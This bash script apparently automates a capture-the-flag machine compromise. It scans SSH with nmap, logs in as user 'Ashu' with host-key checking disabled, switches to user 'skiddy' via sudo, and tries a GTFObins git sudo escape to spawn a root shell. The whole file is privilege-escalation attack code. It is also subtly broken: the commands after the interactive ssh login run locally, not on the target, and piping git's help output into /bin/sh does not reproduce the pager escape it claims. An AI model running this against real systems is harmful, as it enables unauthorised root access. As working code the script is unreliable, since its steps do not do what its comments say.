#!/bin/bash

# Prompt for IP address
read -p "Enter the IP address: " ip_address

# Basic enumeration to obtain Ashu's password/ssh id_rsa key
echo "Basic enumeration in progress..."
if ! nmap -p 22 --script ssh2-enum-algos "$ip_address"; then
  echo "Failed to perform basic enumeration."
  exit 1
fi

# Connect to the machine as user Ashu
echo "Connecting to $ip_address as user Ashu..."
if ! ssh -o StrictHostKeyChecking=no Ashu@"$ip_address"; then
  echo "Failed to connect as user Ashu."
  exit 1
fi

# Check sudo privileges for user skiddy
echo "Checking sudo privileges for user skiddy..."
if ! sudo -l -U skiddy; then
  echo "Failed to check sudo privileges for user skiddy."
  exit 1
fi

# Elevate to user skiddy shell
echo "Elevating to user skiddy shell..."
if ! sudo su -c "echo 'Elevated to user skiddy shell.'" skiddy; then
  echo "Failed to elevate to user skiddy shell."
  exit 1
fi

# Confirm sudo privileges to run git as sudo
echo "Checking sudo privileges for running git..."
if ! sudo -l | grep -i "git"; then
  echo "Failed to check sudo privileges for running git."
  exit 1
fi

# Exploit GTFObins to obtain root shell
echo "Exploiting GTFObins to gain root shell..."
if ! sudo git -p help config | /bin/sh; then
  echo "Failed to exploit GTFObins to gain root shell."
  exit 1
fi

echo "Script execution completed."
